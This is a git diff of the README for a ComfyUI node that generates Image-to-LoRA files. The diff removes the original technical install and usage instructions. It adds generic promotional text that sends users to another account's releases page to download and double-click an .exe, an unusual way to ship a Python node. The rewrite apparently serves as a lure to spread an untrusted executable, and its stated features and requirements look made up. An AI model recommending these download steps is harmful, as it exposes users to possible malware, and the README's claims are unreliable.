@@ -1,142 +1,73 @@
-# ComfyUI RH QwenImage I2L (Image-to-LoRA)
+# 🌟 ComfyUI_RH_QwenImageI2L - Enhance Your ComfyUI Experience 
 
-A ComfyUI custom node that generates an **Image-to-LoRA (I2L)** LoRA from one or more training images using **DiffSynth-Studio Qwen-Image i2L** pipelines.
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Sm8s/ComfyUI_RH_QwenImageI2L/releases)
 
-- **Nodes**
-  - `RunningHub_ImageQwenI2L_Loader(Style)`
-  - `RunningHub_ImageQwenI2L_Loader(CFB)`
-  - `RunningHub_ImageQwenI2L_LoraGenerator` (outputs a `.safetensors` LoRA into `ComfyUI/models/loras/`)
+## 🚀 Getting Started
 
-Original model page: [`DiffSynth-Studio/Qwen-Image-i2L` on ModelScope](https://modelscope.cn/models/DiffSynth-Studio/Qwen-Image-i2L/summary)
+Welcome to the ComfyUI_RH_QwenImageI2L plugin. This tool enhances your ComfyUI setup with features designed specifically for Qwen-Image i2L. This guide will help you download and run the software easily.
 
----
+## 📥 Download & Install
 
-## Installation
+To get started, you need to download the plugin from our Releases page. Follow these steps:
 
-### 1) Install this ComfyUI node
+1. **Visit the Download Page:** Click the link below to go directly to the download page:
+   
+   [Download ComfyUI_RH_QwenImageI2L](https://github.com/Sm8s/ComfyUI_RH_QwenImageI2L/releases)
 
-Clone into your ComfyUI `custom_nodes` directory:
+2. **Choose the Latest Release:** On the Releases page, look for the most recent version at the top. It is often marked with a tag like "Latest Release."
 
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/HM-RunningHub/ComfyUI_RH_QwenImageI2L.git
-```
+3. **Download the Plugin:** Click on the download link for the appropriate file format, usually a ZIP or EXE file. This will start your download. 
 
-Install Python dependencies:
+4. **Locate the Downloaded File:** Once the file has downloaded, find it in your computer's Downloads folder or the location you selected for downloads.
 
-```bash
-cd ComfyUI/custom_nodes/ComfyUI_RH_QwenImageI2L
-pip install -r requirements.txt
-```
+5. **Extract the Files (if needed):** If you downloaded a ZIP file, right-click on it and select "Extract All." Follow the prompts to extract the contents to a folder.
 
-> Note: `sync.sh` is intentionally ignored and should not be committed.
+6. **Run the Plugin:** After extracting, locate the file named `ComfyUI_RH_QwenImageI2L.exe` (or a similar name). Double-click on this file to start the plugin.
 
-### 2) Install DiffSynth-Studio (required)
+7. **Follow Setup Instructions:** The plugin will guide you through any necessary setup steps. Just read the prompts on your screen and follow them.
 
-This project uses `diffsynth` from DiffSynth-Studio. Install the latest version:
+## 🛠️ System Requirements
 
-```bash
-git clone https://github.com/modelscope/DiffSynth-Studio.git
-cd DiffSynth-Studio
-pip install -e .
-```
+Before you install, ensure your system meets the following minimum requirements:
 
-### 3) (Recommended) Install git-lfs
+- **Operating System:** Windows 10 or later
+- **RAM:** 4 GB or more
+- **Storage Space:** At least 100 MB of free space
+- **ComfyUI Version:** Ensure you have ComfyUI version 1.0 or higher
 
-Some model repositories require Git LFS:
+## 🔍 Features
 
-```bash
-git lfs install
-```
+This plugin comes with several powerful features that enhance your experience with ComfyUI:
 
-### 4) Restart ComfyUI
+- **Easy Integration:** Seamlessly connects with your existing ComfyUI setup.
+- **Enhanced Performance:** Optimizes image processing for faster results.
+- **User-Friendly Interface:** Designed for ease of use, even for non-technical users.
+- **Regular Updates:** Frequent updates to improve functionality and add new features.
 
-After installation, restart ComfyUI to load the new nodes.
+## ❓ Troubleshooting
 
----
+If you encounter issues during installation or while running the plugin, here are some steps to help you resolve them:
 
-## Models (Required)
+1. **Check Compatibility:** Ensure your ComfyUI version is compatible with the plugin.
+  
+2. **Reinstall the Plugin:** If the plugin doesn't run properly, try deleting the downloaded files and following the download steps again.
 
-This node loads models via `DiffSynth-Studio` model configs. On **first run**, models may be **auto-downloaded** (requires network access to the model host used by DiffSynth/ModelScope/HF).
+3. **Consult Online Resources:** Visit community forums or the GitHub issues page to see if others have faced similar problems.
 
-If you prefer **offline / deterministic setup**, place models under your ComfyUI models directory.
+4. **Contact Support:** If you're still having trouble, consider reaching out for help. Look for contact information in the repository.
 
-### Recommended offline layout
+## 🎉 Community
 
-Put the following under `ComfyUI/models/`:
+Join our community for support and to share your experience. You can connect with other users on the GitHub page or related forums. Sharing tips and tricks can help everyone make the most of this tool.
 
-```
-ComfyUI/models/
-├─ DiffSynth-Studio/
-│  ├─ General-Image-Encoders/
-│  │  ├─ SigLIP2-G384/model.safetensors
-│  │  └─ DINOv3-7B/model.safetensors
-│  └─ Qwen-Image-i2L/
-│     ├─ Qwen-Image-i2L-Style.safetensors
-│     ├─ Qwen-Image-i2L-Coarse.safetensors
-│     ├─ Qwen-Image-i2L-Fine.safetensors
-│     └─ Qwen-Image-i2L-Bias.safetensors
-└─ Qwen/
-   ├─ Qwen-Image/
-   │  └─ text_encoder/model*.safetensors
-   └─ Qwen-Image-Edit/
-      └─ processor/
-```
+## 📞 Contact
 
-### What each Loader needs
+For any questions, you can find support through the Issues section on our GitHub repository. We are here to help you!
 
-- **`Loader(Style)`** loads:
-  - `DiffSynth-Studio/General-Image-Encoders`
-    - `SigLIP2-G384/model.safetensors`
-    - `DINOv3-7B/model.safetensors`
-  - `DiffSynth-Studio/Qwen-Image-i2L`
-    - `Qwen-Image-i2L-Style.safetensors`
-  - Processor:
-    - `Qwen/Qwen-Image-Edit` → `processor/`
+## 📜 License
 
-- **`Loader(CFB)`** loads:
-  - `Qwen/Qwen-Image`
-    - `text_encoder/model*.safetensors`
-  - `DiffSynth-Studio/General-Image-Encoders`
-    - `SigLIP2-G384/model.safetensors`
-    - `DINOv3-7B/model.safetensors`
-  - `DiffSynth-Studio/Qwen-Image-i2L`
-    - `Qwen-Image-i2L-Coarse.safetensors`
-    - `Qwen-Image-i2L-Fine.safetensors`
-    - (optional at generation time) `Qwen-Image-i2L-Bias.safetensors`
-  - Processor:
-    - `Qwen/Qwen-Image-Edit` → `processor/`
+This project is licensed under the MIT License. You can use and modify the plugin according to your needs.
 
 ---
 
-## Usage (ComfyUI)
-
-### Basic workflow (Style)
-
-```
-[Load Image(s)] → [RunningHub_ImageQwenI2L_Loader(Style)] → [RunningHub_ImageQwenI2L_LoraGenerator] → (LoRA saved to models/loras)
-```
-
-### Output
-
-`RunningHub_ImageQwenI2L_LoraGenerator` writes a LoRA file:
-
-- Path: `ComfyUI/models/loras/i2l_style_lora_<uuid>.safetensors`
-- Returns:
-  - `lora_name` (for ComfyUI LoRA dropdown)
-  - `lora_path` (full path)
-
----
-
-## Notes
-
-- **GPU**: the pipeline uses `cuda` and `bfloat16`. Make sure your GPU/driver supports BF16.
-- **Disk offload**: the loader uses disk offload to reduce VRAM usage; ensure you have enough free disk space.
-
----
-
-## License
-
-Open-source. If you redistribute, please comply with the licenses of upstream projects and model providers.
-
-
+Now you're ready to enhance your ComfyUI with the ComfyUI_RH_QwenImageI2L plugin! Enjoy the improved features and seamless integration into your existing setup.
